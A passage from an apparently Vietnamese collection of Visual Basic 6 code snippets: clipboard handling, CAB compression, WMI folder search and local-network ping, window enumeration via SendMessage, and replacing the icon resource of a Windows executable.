MsgBox "Failed to get Clipboard Text"
Else
myLock = GlobalLock(myStrPtr)
myLen = GlobalSize(myStrPtr) 
myData = String$(myLen \ 2 - 1, vbNullChar)
lstrcpy StrPtr(myData), myLock GlobalUnlock myStrPtr 
End If  
CloseClipboard
 Get_clipboard = myData
End Function 

 Private Sub Set_clipboard(s As String) 
Dim myStrPtr As Long, myLen As Long, myLock As Long 
 OpenClipboard 0&amp; 
EmptyClipboard
 myLen = LenB(s) + 2 
myStrPtr = GlobalAlloc(GMEM_MOVEABLE Or GMEM_ZEROINIT, myLen)
myLock = GlobalLock(myStrPtr) lstrcpy myLock, StrPtr(s) GlobalUnlock myStrPtr 
 SetClipboardData CF_UNICODETEXT, myStrPtr
If IsClipboardFormatAvailable(CF_UNICODETEXT) = 0 Then MsgBox "Failed to set Clipboard Text" CloseClipboard
End Sub 

 Public Sub Set_Text(hWnd As Long, sUni As String)
Set_clipboard sUni SendMessage hWnd, WM_PASTE, 0, 0 End Sub
 Public Function Get_Text(TextBoxVB As TextBox) As String
Dim i As Integer 
With TextBoxVB
i = .SelStart 
.SelStart = 0 
.SelLength = Len(.Text) 
SendMessage .hWnd, WM_COPY, 0, 0 
.SelStart = i 
Get_Text = Get_clipboard 
End With
End Function  

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090817040820</MaVD>
    <NoiDung>(Thư viện COM MakeCab 1.0 Type Library với file C:\Windows\System32\catsrvut.dll\6)
* Nén 1 file
* Nén Folder, kể cả Folder con, cháu
* Tạo đường dẫn tương đối như Zip hay Rar
* Không hổ trợ tên file hay folder Unicode, tuy nhiên nội dung file không đổi
Đã test trên winXP

Dim Xcab As New COMMKCABLib.MakeCab
    Dim SpecialPath$
    'truongphu
Private Sub Command1_Click()
Set objDialog = CreateObject("UserAccounts.CommonDialog")
    objDialog.InitialDir = "D:\"
    objDialog.ShowOpen
        If objDialog.FileName &lt;&gt; "" Then
        Dim Fname$: Fname = Mid(objDialog.FileName, InStrRev(objDialog.FileName, "\") + 1)
                Xcab.CreateCab Left(objDialog.FileName, Len(objDialog.FileName) - 3) &amp; "cab", False, 0, False
                Xcab.AddFile Fname, Fname
                Xcab.CloseCab
                    MsgBox "Ðã Xong"
        End If
End Sub
 
Private Sub Command2_Click()
'On Error Resume Next
Set PathFolder = CreateObject("Shell.Application").BrowseForFolder(0, "Select a folder:", 0)
Dim FolderAll As Folder, Spath$, mFilePath$
        Xcab.CreateCab PathFolder.Self.Path &amp; ".cab", False, 0, False
            Set FolderAll = CreateObject("Scripting.FileSystemObject").GetFolder(PathFolder.Self.Path)
            Spath = Mid(PathFolder.Self.Path, InStrRev(PathFolder.Self.Path, "\") + 1)
            SpecialPath = Replace(PathFolder.Self.Path, Spath, "")
            Set MyFiles = FolderAll.Files
                    For Each mFile In MyFiles
                        Xcab.AddFile mFile.Path, Spath &amp; "\" &amp; mFile.Name
                    Next
                    MoveToSub FolderAll
        Xcab.CloseCab
            MsgBox "Ðã Xong"
 
End Sub
 
Private Sub MoveToSub(AFolder As Folder)
    Set MoreFolders = AFolder.SubFolders
    Dim TmpFolder As Folder, SSpath$, mFilePath$
      'On Error Resume Next
        For Each TmpFolder In MoreFolders
            SSpath = Replace(TmpFolder, SpecialPath, "")
            Set MoreFiles = TmpFolder.Files
                For Each TmpFile In MoreFiles
                    Xcab.AddFile TmpFile.Path, SSpath &amp; "\" &amp; TmpFile.Name
                Next
            MoveToSub TmpFolder
        Next
End Sub
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091317041312</MaVD>
    <NoiDung>Cần Command1, text1 và list1

Private Sub Command1_Click()
Set colFolders = GetObject("winmgmts:").ExecQuery _
    ("Select * From Win32_Directory Where FileName Like '%" &amp; Text1.Text &amp; "%'")
List1.Clear
For Each objFolder In colFolders
DoEvents
    List1.AddItem objFolder.Caption
Next
If List1.ListCount = 0 Then MsgBox "Không Thâ'y"
End Sub


Ghi chú: nếu text1 ="", ta sẽ có kết quả liệt kê toàn bộ thư mục trong máy, nhưng sẽ rất lâu</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091617041654</MaVD>
    <NoiDung>Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Const WM_GETTEXTLENGTH = &amp;HE: Private Const WM_GETTEXT = &amp;HD
 
Public Function GetClsName(hwnd As Long) As String
  Dim lpClassName As String, RetVal As Long
  lpClassName = Space(256)
  RetVal = GetClassName(hwnd, lpClassName, 256)
  lpClassName = Left$(lpClassName, RetVal)
  GetClsName = lpClassName
End Function
 
Public Function WinGetText(hwnd As Long) As String
    Dim length As Long, result As Long, strtmp As String, s As Variant
 
    length = SendMessage(hwnd, WM_GETTEXTLENGTH, ByVal 0, ByVal 0) + 1
    strtmp = Space(length)
    result = SendMessage(hwnd, WM_GETTEXT, ByVal length, ByVal strtmp)
    s = Split(strtmp, vbNullChar)
    If s(0) = "" Then s(0) = "NoTitle" Else s(0) = s(0)
    WinGetText = s(0)
End Function
 
Private Sub getChild(hwnd As Long)
    Dim h As Long, str As String
 
    h = FindWindowEx(hwnd, 0, vbNullString, vbNullString)
    While h &lt;&gt; 0
        str = WinGetText(h) &amp; " \ " &amp; GetClsName(h) &amp; " \" &amp; h
        List1.AddItem str
        getChild h 'Ðê Quy, Tìm hWnd cho Ðê'n hê't
        h = FindWindowEx(hwnd, h, vbNullString, vbNullString)
    Wend
    
End Sub
 
Private Sub getChild2()
    Dim h As Long, str As String, hh As Long
    
    For i = 0 To List1.ListCount - 1
        hh = CLng(Mid(List1.List(i), InStrRev(List1.List(i), "\") + 1))
 
        h = FindWindowEx(hh, 0, vbNullString, vbNullString)
 
    While h &lt;&gt; 0
        List2.AddItem "*---" &amp; "Parent: hWnd = " &amp; hh &amp; " --&gt;"
        str = WinGetText(h) &amp; " \ " &amp; GetClsName(h) &amp; " \" &amp; h
        List2.AddItem str
        
        h = FindWindowEx(hh, h, vbNullString, vbNullString)
   Wend
    Next i
End Sub
 
Private Sub Command1_Click()
List1.Clear: List2.Clear
    Dim h As Long
    h = FindWindow(vbNullString, Text1.Text)
    Label1.Caption = "Window Title: " &amp; WinGetText(h) &amp; ", ClassName: " &amp; GetClsName(h) &amp; ", hWnd: " &amp; h
    If h = 0 Then Exit Sub
    getChild h
    getChild2
    If List2.ListCount = 0 Then List2.AddItem "Không có cháu !"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091817041815</MaVD>
    <NoiDung>Private Sub Command1_Click()
Set objWMI = GetObject("winmgmts:\root\cimv2")
For i = 0 To 20 '&lt;-- Ping khá lâu, nên làm tu'` tu'`
'DoEvents
    Set colPingedComputers = objWMI.ExecQuery _
    ("Select * from Win32_PingStatus Where Address = '10.0.0." &amp; i &amp; "'")
' Ðia chi IP mang LAN là Ðia chi Modem ADSL, thuo'`ng khác sô' cuô'i. 10.0.0.2 là Modem CNet
        For Each objComputer In colPingedComputers
            If objComputer.StatusCode = 0 Then
                List1.AddItem "10.0.0." &amp; i &amp; vbTab &amp; "X"
            Else
                List1.AddItem "10.0.0." &amp; i
            End If
        Next
Next
MsgBox "Ðã Xong"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092517042501</MaVD>
    <NoiDung>1- Chỉ dựa trên hàm SendMessage:
Thông thường chúng ta hay tìm hWnd của cửa sổ với FindWindow (chỉ tìm W-cha) và FindWindowEx (W-con) mà các đối số của 2 hàm khá phức tạp, nhất là hàm FindWindowEx.
Thực chất khi chạy hàm FindWindow hay FindWindowEx thì chúng cũng phải dò tìm (vòng lặp) các cửa sổ cho đến khi gặp điều kiện thích hợp hoặc duyệt hết các cửa sổ...
Dùng SendMessage ta cũng chủ động động dò tìm các cửa sổ trùng Window Title, không quan tâm đến khai báo ClassName.

2- Chỉ dùng số hWnd nhỏ:
Một cửa sổ có 2 số hWnd, số hWnd lớn thì các hàm FindWindow và FindWindowEx "chuyên trị"
Ngoài ra cửa sổ ấy còn có số hWnd nhỏ (&lt;1000) từ trước đến giờ chưa ai dùng đến.
Số hWnd nhỏ nầy vẫn có tất cả đặc tính biểu trưng như số hWnd lớn, ta có thể gởi các thông điệp đến hWnd nhỏ để thực thi tác vụ mong muốn...

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
'---------------------
Const WM_GETTEXTLENGTH = &amp;HE:  Const WM_GETTEXT = &amp;HD: Const WM_CLOSE = &amp;H10
Const WM_KEYDOWN = &amp;H100: Const VK_RETURN = &amp;HD: Const WM_KEYUP = &amp;H101
Const MK_LBUTTON = &amp;H1: Const WM_LBUTTONDOWN = &amp;H201: Const WM_LBUTTONUP = &amp;H202
Dim i&amp;
 
Public Function WinGetText(hwnd As Long) As String
On Error Resume Next
    Dim Length&amp;, result&amp;, strtmp$, S As Variant
    Length&amp; = SendMessage(hwnd, WM_GETTEXTLENGTH, ByVal 0, ByVal 0) + 1
    strtmp$ = Space$(Length)
    result&amp; = SendMessage(hwnd, WM_GETTEXT, ByVal Length, ByVal strtmp)
    S = Split(strtmp, vbNullChar)
    WinGetText$ = S(0)
End Function
 
Private Sub Command1_Click()
If TextBox1 = "" Then Exit Sub
    For i&amp; = 0 To 1000
        If UCase(WinGetText(i&amp;)) = UCase(TextBox1.Text) Then
            Exit For
        End If
    Next
    If i = 1001 Then Me.Caption = 0 Else Me.Caption = i
End Sub
 
Private Sub Command2_Click()
SendMessage i, WM_CLOSE, 0, 0
End Sub
 
Private Sub Command3_Click()
SendMessage i, WM_KEYDOWN, VK_RETURN, 0
SendMessage i, WM_KEYUP, VK_RETURN, 0
End Sub
 
Private Sub Form_Load()
Shell "calc"
End Sub

* Ứng dụng:
- Khi chạy Project trên, Calculator được gọi thêm cho tiện
Bạn chỉ việc nhấn nút "Find hWnd" sẽ hiện số hWnd của Calculator lên Form1.caption; Nhấn nút "SendMessage WM_CLOSE" để đóng Calculator
- Bạn gõ 'start' vào textbox, nhấn "Find hWnd", sẽ tìm hWnd của nút Start góc trái dưới màn hình, nhấn "SendMessage Enter" để mở Menu Start
- Gọi lại Calculator, gõ 'pi' vào textbox, nhấn "Find hWnd" rồi "SendMessage WM_CLOSE" để làm biến mất nút 'pi' trên Calculator...
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092917042948</MaVD>
    <NoiDung>Module1:
Option Explicit
Type DIB_HEADER
   Size        As Long
   Width       As Long
   Height      As Long
   Planes      As Integer
   Bitcount    As Integer
   Reserved    As Long
   ImageSize   As Long
End Type
 
Type ICON_DIR_ENTRY
   bWidth            As Byte
   bHeight           As Byte
   bColorCount       As Byte
   bReserved         As Byte
   wPlanes           As Integer
   wBitCount         As Integer
   dwBytesInRes      As Long
   dwImageOffset     As Long
End Type
 
Type ICON_DIR
   Reserved          As Integer
   Type              As Integer
   Count             As Integer
End Type
 
Type DIB_BITS
   Bits()            As Byte
End Type
 
Public Enum Errors
   FILE_CREATE_FAILED = 1000
   FILE_READ_FAILED
   INVALID_PE_SIGNATURE
   INVALID_ICO
   NO_RESOURCE_TREE
   NO_ICON_BRANCH
   CANT_HACK_HEADERS
End Enum
Public Function ReplaceIcons(Source As String, Dest As String, Error As String) As Long
   
   Dim IcoDir As ICON_DIR
   Dim IcoDirEntry As ICON_DIR_ENTRY
   Dim tBits As DIB_BITS
   Dim Icons() As IconDescriptor
   Dim lngRet As Long
   Dim BytesRead As Long
   Dim hSource As Long
   Dim hDest As Long
   Dim ResTree As Long
    
   hSource = CreateFile(Source, ByVal &amp;H80000000, 0, ByVal 0&amp;, 3, 0, ByVal 0)
   If hSource &gt;= 0 Then
      If Valid_ICO(hSource) Then
         SetFilePointer hSource, 0, 0, 0
         ReadFile hSource, IcoDir, 6, BytesRead, ByVal 0&amp;
         ReadFile hSource, IcoDirEntry, 16, BytesRead, ByVal 0&amp;
         SetFilePointer hSource, IcoDirEntry.dwImageOffset, 0, 0
         ReDim tBits.Bits(IcoDirEntry.dwBytesInRes) As Byte
         ReadFile hSource, tBits.Bits(0), IcoDirEntry.dwBytesInRes, BytesRead, ByVal 0&amp;
         CloseHandle hSource
         hDest = CreateFile(Dest, ByVal (&amp;H80000000 Or &amp;H40000000), 0, ByVal 0&amp;, 3, 0, ByVal 0)
         If hDest &gt;= 0 Then
            If Valid_PE(hDest) Then
               ResTree = GetResTreeOffset(hDest)
               If ResTree &gt; 308 Then   ' Sanity check
                  lngRet = GetIconOffsets(hDest, ResTree, Icons)
                  SetFilePointer hDest, Icons(1).Offset, 0, 0
                  WriteFile hDest, tBits.Bits(0), UBound(tBits.Bits), BytesRead, ByVal 0&amp;
                  If Not HackDirectories(hDest, ResTree, Icons(1).Offset, IcoDirEntry) Then
                     Err.Raise CANT_HACK_HEADERS, App.EXEName, "Unable to modify directories in target executable.  File may not contain any icon resources."
                  End If
               Else
                  Err.Raise NO_RESOURCE_TREE, App.EXEName, Dest &amp; " does not contain a valid resource tree.  File may be corrupt."
                  CloseHandle hDest
               End If
            Else
               Err.Raise INVALID_PE_SIGNATURE, App.EXEName, Dest &amp; " is not a valid Win32 executable."
               CloseHandle hDest
            End If
         CloseHandle hDest
         Else
            Err.Raise FILE_CREATE_FAILED, App.EXEName, "Failed to open " &amp; Dest &amp; ". Make sure file is not in use by another program."
         End If
      Else
         Err.Raise INVALID_ICO, App.EXEName, Source &amp; " is not a valid icon resource file."
         CloseHandle hSource
      End If
   Else
      Err.Raise FILE_CREATE_FAILED, App.EXEName, "Failed to open " &amp; Source &amp; ". Make sure file is not in use by another program."
   End If
   ReplaceIcons = 0
   Exit Function
ErrHandler:
   ReplaceIcons = Err.Number
   Error = Err.Description
End Function
Public Function Valid_ICO(hFile As Long) As Boolean
   Dim tDir          As ICON_DIR
   Dim BytesRead     As Long
   If (hFile &gt; 0) Then
      ReadFile hFile, tDir, Len(tDir), BytesRead, ByVal 0&amp;
      If (tDir.Reserved = 0) And (tDir.Type = 1) And (tDir.Count &gt; 0) Then
         Valid_ICO = True
      Else
         Valid_ICO = False
      End If
   Else
      Valid_ICO = False
   End If
End Function


Module2:

Option Explicit
Public Type IMAGE_DOS_HEADER
   Magic    As Integer
   cblp     As Integer
   cp       As Integer
   crlc     As Integer
   cparhdr  As Integer
   minalloc As Integer
   maxalloc As Integer
   ss       As Integer
   sp       As Integer
   csum     As Integer
   ip       As Integer
   cs       As Integer
   lfarlc   As Integer
   ovno     As Integer
   res(3)   As Integer
   oemid    As Integer
   oeminfo  As Integer
   res2(9)  As Integer
   lfanew      As Long
End Type
 
Public Type IMAGE_FILE_HEADER
   Machine              As Integer
   NumberOfSections     As Integer
   TimeDateStamp        As Long
   PointerToSymbolTable As Long
   NumberOfSymbols      As Long
   SizeOfOtionalHeader  As Integer
   Characteristics      As Integer
End Type
 
Public Type IMAGE_DATA_DIRECTORY
   DataRVA     As Long
   DataSize    As Long
End Type
 
Public Type IMAGE_OPTIONAL_HEADER
   Magic             As Integer
   MajorLinkVer      As Byte
   MinorLinkVer      As Byte
   CodeSize          As Long
   InitDataSize      As Long
   unInitDataSize    As Long
   EntryPoint        As Long
   CodeBase          As Long
   DataBase          As Long
   ImageBase         As Long
   SectionAlignment  As Long
   FileAlignment     As Long
   MajorOSVer        As Integer
   MinorOSVer        As Integer
   MajorImageVer     As Integer
   MinorImageVer     As Integer
   MajorSSVer        As Integer
   MinorSSVer        As Integer
   Win32Ver          As Long
   ImageSize         As Long
   HeaderSize        As Long
   Checksum          As Long
   Subsystem         As Integer
   DLLChars          As Integer
   StackRes          As Long
   StackCommit       As Long
   HeapReserve       As Long
   HeapCommit        As Long
   LoaderFlags       As Long
   RVAsAndSizes      As Long
   DataEntries(15)   As IMAGE_DATA_DIRECTORY
End Type
 
Public Type IMAGE_SECTION_HEADER
   SectionName(7)    As Byte
   Address           As Long
   VirtualAddress    As Long
   SizeOfData        As Long
   PData             As Long
   PReloc            As Long
   PLineNums         As Long
   RelocCount        As Integer
   LineCount         As Integer
   Characteristics   As Long
End Type
 
Type IMAGE_RESOURCE_DIR
   Characteristics   As Long
   TimeStamp         As Long
   MajorVersion      As Integer
   MinorVersion      As Integer
   NamedEntries      As Integer
   IDEntries         As Integer
End Type
 
Type RESOURCE_DIR_ENTRY
   Name              As Long
   Offset            As Long
End Type
 
Type RESOURCE_DATA_ENTRY
   Offset            As Long
   Size              As Long
   CodePage          As Long
   Reserved          As Long
End Type
 
Public Type IconDescriptor
   ID       As Long
   Offset   As Long
   Size     As Long
End Type
 
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Public Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Any, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Public Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Any) As Long
Public Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, lpOverlapped As Any) As Long
Public Declare Function SetFilePointer Lib "kernel32" (ByVal hFile As Long, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
 
Private SectionAlignment   As Long
Private FileAlignment      As Long
Private ResSectionRVA      As Long
Private ResSectionOffset   As Long
Public Function Valid_PE(hFile As Long) As Boolean
   
   Dim Buffer(12)      As Byte
   Dim lngBytesRead    As Long
   Dim tDosHeader      As IMAGE_DOS_HEADER
   
   If (hFile &gt; 0) Then
      ReadFile hFile, tDosHeader, ByVal Len(tDosHeader), lngBytesRead, ByVal 0&amp;
      CopyMemory Buffer(0), tDosHeader.Magic, 2
      If (Chr(Buffer(0)) &amp; Chr(Buffer(1)) = "MZ") Then
         SetFilePointer hFile, tDosHeader.lfanew, 0, 0
         ReadFile hFile, Buffer(0), 4, lngBytesRead, ByVal 0&amp;
         If (Chr(Buffer(0)) = "P") And (Chr(Buffer(1)) = "E") And (Buffer(2) = 0) And (Buffer(3) = 0) Then
            Valid_PE = True
            Exit Function
         End If
      End If
   End If
   
   Valid_PE = False
   
End Function
Public Function GetResTreeOffset(hFile As Long) As Long
On Error GoTo ErrHandler:
   
   Dim tDos          As IMAGE_DOS_HEADER
   Dim tFile         As IMAGE_FILE_HEADER
   Dim tOptional     As IMAGE_OPTIONAL_HEADER
   Dim tSections()   As IMAGE_SECTION_HEADER
   Dim BytesRead     As Long
   Dim intC          As Integer
   Dim TreeFound     As Boolean
   
   TreeFound = False
   If (hFile &gt; 0) Then
      SetFilePointer hFile, 0, 0, 0
      ' Get the offset of the Image File Header
      ReadFile hFile, tDos, Len(tDos), BytesRead, ByVal 0&amp;
      SetFilePointer hFile, ByVal tDos.lfanew + 4, 0, 0
      ' Get the Image File Header and the Image Optional Header
      ReadFile hFile, tFile, Len(tFile), BytesRead, ByVal 0&amp;
      ReadFile hFile, tOptional, Len(tOptional), BytesRead, ByVal 0&amp;
      ' Get section headers
      ReDim tSections(tFile.NumberOfSections - 1) As IMAGE_SECTION_HEADER
      ReadFile hFile, tSections(0), Len(tSections(0)) * tFile.NumberOfSections, BytesRead, ByVal 0&amp;
      ' Make sure there is a resource tree in this file
      If (tOptional.DataEntries(2).DataSize) Then
         ' Save section alignment and file alignment of image
         SectionAlignment = tOptional.SectionAlignment
         FileAlignment = tOptional.FileAlignment
         ' Determine which section contains the resource tree
         For intC = 0 To UBound(tSections)
            If (tSections(intC).VirtualAddress &lt;= tOptional.DataEntries(2).DataRVA) _
             And ((tSections(intC).VirtualAddress + tSections(intC).SizeOfData) &gt; tOptional.DataEntries(2).DataRVA) Then
               TreeFound = True
               ' Save RVA and offset of resource section for future calculations
               ResSectionRVA = tSections(intC).VirtualAddress
               ResSectionOffset = tSections(intC).PData
               ' Calculate the physical file offset of the resouce tree
               GetResTreeOffset = tSections(intC).PData + (tOptional.DataEntries(2).DataRVA - tSections(intC).VirtualAddress)
               Exit For
            End If
         Next intC
         If Not TreeFound Then
            GetResTreeOffset = -1
         End If
      Else
         GetResTreeOffset = -1
      End If
   Else
      GetResTreeOffset = -1
   End If
   Exit Function
 
ErrHandler:
   MsgBox "An error occurred while locating the resource tree. " _
    &amp; " Please make sure neither of the specified files are in use.", vbOKOnly + vbExclamation, _
    App.EXEName &amp; " - " &amp; eRR.Description
   
End Function
Public Function GetIconOffsets(hFile As Long, TreeOffset As Long, Icons() As IconDescriptor) As Long
On Error GoTo ErrHandler:
 
   Dim Root          As IMAGE_RESOURCE_DIR      ' Root node of resource tree
   Dim L1Entries()   As RESOURCE_DIR_ENTRY      ' 1st level of directory entries
   Dim L2Root()      As IMAGE_RESOURCE_DIR      ' Level 2 resource directories
   Dim L2Entries()   As RESOURCE_DIR_ENTRY      ' 2nd level of directory entries
   Dim L3Root()      As IMAGE_RESOURCE_DIR      ' Level 3 resource directories
   Dim L3Entries()   As RESOURCE_DIR_ENTRY      ' 3rd level of directory entries
   Dim DataEntries() As RESOURCE_DATA_ENTRY     ' Resource data entries
   Dim DIB           As DIB_HEADER              ' Descriptor for icon images
   Dim iLvl1         As Integer                 ' Loop Counter (first level)
   Dim iLvl2         As Integer                 ' Loop Counter (second level)
   Dim iLvl3         As Integer                 ' Loop Counter (third level)
   Dim Cursor        As Long                    ' Temp val for setting file pointer
   Dim BytesRead     As Long                    ' For ReadFile()
   Dim Count         As Integer                 ' Number of icons found
   
   If (hFile &gt; 0) Then
      Count = 0
      SetFilePointer hFile, ByVal TreeOffset, 0, 0
      ' Get the root node and begin navigating the resource tree
      ReadFile hFile, Root, Len(Root), BytesRead, ByVal 0
      ReDim L2Root(Root.NamedEntries + Root.IDEntries) As IMAGE_RESOURCE_DIR
      ReDim L1Entries(Root.NamedEntries + Root.IDEntries) As RESOURCE_DIR_ENTRY
      ' Get first level child nodes
      For iLvl1 = 1 To (Root.NamedEntries + Root.IDEntries)
         SetFilePointer hFile, TreeOffset + 8 + (iLvl1 * 8), 0, 0
         ReadFile hFile, L1Entries(iLvl1), 8, BytesRead, ByVal 0&amp;
         If L1Entries(iLvl1).Name = 3 Then
            ' Jump to level 2 and get directory
            '     Strip high-order byte from offset
            CopyMemory Cursor, L1Entries(iLvl1).Offset, 3
            Cursor = Cursor + TreeOffset
            SetFilePointer hFile, ByVal Cursor, 0, 0
            ReadFile hFile, L2Root(iLvl1), 16, BytesRead, ByVal 0&amp;
            ReDim L3Root(L2Root(iLvl1).NamedEntries + L2Root(iLvl1).IDEntries) As IMAGE_RESOURCE_DIR
            ReDim L2Entries(L2Root(iLvl1).IDEntries + L2Root(iLvl1).NamedEntries) As RESOURCE_DIR_ENTRY
            For iLvl2 = 1 To (L2Root(iLvl1).IDEntries + L2Root(iLvl1).NamedEntries)
               ' Read second level child nodes
               CopyMemory Cursor, L1Entries(iLvl1).Offset, 3
               Cursor = Cursor + TreeOffset
               SetFilePointer hFile, Cursor + 8 + (iLvl2 * 8), 0, 0
               ReadFile hFile, L2Entries(iLvl2), 8, BytesRead, ByVal 0&amp;
               ' Jump to level 3 and get directory
               CopyMemory Cursor, L2Entries(iLvl2).Offset, 3
               Cursor = Cursor + TreeOffset
               SetFilePointer hFile, ByVal Cursor, 0, 0
               ReadFile hFile, L3Root(iLvl2), 16, BytesRead, ByVal 0&amp;
               ReDim L3Entries(L3Root(iLvl2).NamedEntries + L3Root(iLvl2).IDEntries) As RESOURCE_DIR_ENTRY
               ReDim DataEntries(L3Root(iLvl2).NamedEntries + L3Root(iLvl2).IDEntries) As RESOURCE_DATA_ENTRY
               For iLvl3 = 1 To (L3Root(iLvl2).NamedEntries + L3Root(iLvl2).IDEntries)
                  ' Read third level child nodes
                  CopyMemory Cursor, L2Entries(iLvl2).Offset, 3
                  Cursor = Cursor + TreeOffset
                  SetFilePointer hFile, (Cursor + 8 + (iLvl3 * 8)), 0, 0
                  ReadFile hFile, L3Entries(iLvl3), 8, BytesRead, ByVal 0&amp;
                  ' Jump to IMAGE_DATA_ENTRY and get RVA of IconDir structure
                  SetFilePointer hFile, TreeOffset + (L3Entries(iLvl3).Offset), 0, 0
                  ReadFile hFile, DataEntries(iLvl3), 16, BytesRead, ByVal 0&amp;
                  ' Convert RVA of IconDir structure to file offset and store
                  Count = Count + 1
                  ReDim Preserve Icons(Count) As IconDescriptor
                  Icons(Count).Offset = RVA_to_Offset(DataEntries(iLvl3).Offset)
                  ' Store ID of icon resource
                  Icons(Count).ID = L2Entries(iLvl2).Name
                  ' Store Size of icon resource
                  SetFilePointer hFile, Icons(Count).Offset, 0, 0
                  ReadFile hFile, DIB, ByVal Len(DIB), BytesRead, ByVal 0&amp;
                  Icons(Count).Size = DIB.ImageSize + 40
               Next iLvl3
            Next iLvl2
         End If
      Next iLvl1
   Else
      Count = 0
   End If
   
   ' Return the number of icons found
   GetIconOffsets = Count
   Exit Function
   
ErrHandler:
   MsgBox "An error occurred while locating the icon resources. " _
    &amp; " Please make sure neither of the specified files are in use.", vbOKOnly + vbExclamation, _
    App.EXEName &amp; " - " &amp; eRR.Description
   
End Function
Public Function HackDirectories(hFile As Long, ResTree As Long, DIBOffset As Long, _
                                DIBAttrib As ICON_DIR_ENTRY) As Boolean
On Error GoTo ErrHandler:
 
   Dim Cursor        As Long                 ' File pointer position
   Dim Root          As IMAGE_RESOURCE_DIR   ' Root node of res tree
   Dim L1Entries()   As RESOURCE_DIR_ENTRY   ' First-level child nodes
   Dim L2Root()      As IMAGE_RESOURCE_DIR   ' Second-level root nodes
   Dim L2Entries()   As RESOURCE_DIR_ENTRY   ' Second-level child nodes
   Dim L3Root()      As IMAGE_RESOURCE_DIR   ' Third-level root nodes
   Dim L3Entries()   As RESOURCE_DIR_ENTRY   ' Third-level child nodes
   Dim DataEntries() As RESOURCE_DATA_ENTRY  ' IMAGE_RESOURCE_DATA_ENTRY structs
   Dim IcoDir        As ICON_DIR             ' IconDirectory in EXE
   Dim iLvl1         As Integer              ' Loop Counter (first level)
   Dim iLvl2         As Integer              ' Loop Counter (second level)
   Dim iLvl3         As Integer              ' Loop Counter (third level)
   Dim intC          As Integer              ' Loop Counter (general)
   Dim BytesRead     As Long                 ' Returned by Read/WriteFile API's
   
   If (hFile &gt;= 0) Then
      ' Convert DIBOffset to an RVA (needed for RESOURCE_DATA_ENTRY structures)
      DIBOffset = Offset_to_RVA(DIBOffset)
      SetFilePointer hFile, ByVal ResTree, 0, 0
      ReadFile hFile, Root, Len(Root), BytesRead, ByVal 0&amp;
      ReDim L1Entries(Root.NamedEntries + Root.IDEntries) As RESOURCE_DIR_ENTRY
      ReDim L2Root(Root.NamedEntries + Root.IDEntries) As IMAGE_RESOURCE_DIR
      ' Loop through first-level child nodes and find RT_GROUP_ICON branch
      For iLvl1 = 1 To (Root.NamedEntries + Root.IDEntries)
         SetFilePointer hFile, ResTree + 8 + (iLvl1 * 8), 0, 0
         ReadFile hFile, L1Entries(iLvl1), 8, BytesRead, ByVal 0&amp;
         If L1Entries(iLvl1).Name = &amp;HE Then
            ' RT_GROUP_ICON branch found
            CopyMemory Cursor, L1Entries(iLvl1).Offset, 3
            Cursor = Cursor + ResTree
            SetFilePointer hFile, Cursor, 0, 0
            ' Read second-level directory
            ReadFile hFile, L2Root(iLvl1), 16, BytesRead, ByVal 0&amp;
            ReDim L2Entries(L2Root(iLvl1).NamedEntries + L2Root(iLvl1).IDEntries) As RESOURCE_DIR_ENTRY
            ReDim L3Root(L2Root(iLvl1).NamedEntries + L2Root(iLvl1).IDEntries) As IMAGE_RESOURCE_DIR
            For iLvl2 = 1 To (L2Root(iLvl1).NamedEntries + L2Root(iLvl1).IDEntries)
               CopyMemory Cursor, L1Entries(iLvl1).Offset, 3
               Cursor = Cursor + ResTree
               SetFilePointer hFile, Cursor + 8 + (iLvl2 * 8), 0, 0
               ReadFile hFile, L2Entries(iLvl2), 8, BytesRead, ByVal 0&amp;
               CopyMemory Cursor, L2Entries(iLvl2).Offset, 3
               Cursor = Cursor + ResTree
               SetFilePointer hFile, Cursor, 0, 0
               ' Read thrid-level directory
               ReadFile hFile, L3Root(iLvl2), 16, BytesRead, ByVal 0&amp;
               ReDim L3Entries(L3Root(iLvl2).NamedEntries + L3Root(iLvl2).IDEntries) As RESOURCE_DIR_ENTRY
               For iLvl3 = 1 To (L3Root(iLvl2).NamedEntries + L3Root(iLvl2).IDEntries)
                  ' Read third-level child nodes
                  CopyMemory Cursor, L2Entries(iLvl2).Offset, 3
                  Cursor = Cursor + ResTree + 8 + (iLvl3 * 8)
                  SetFilePointer hFile, Cursor, 0, 0
                  ReadFile hFile, L3Entries(iLvl3), 8, BytesRead, ByVal 0&amp;
                  ' Jump to RESOURCE_DATA_ENTRY
                  CopyMemory Cursor, L3Entries(iLvl3).Offset, 3
                  Cursor = Cursor + ResTree
                  SetFilePointer hFile, Cursor, 0, 0
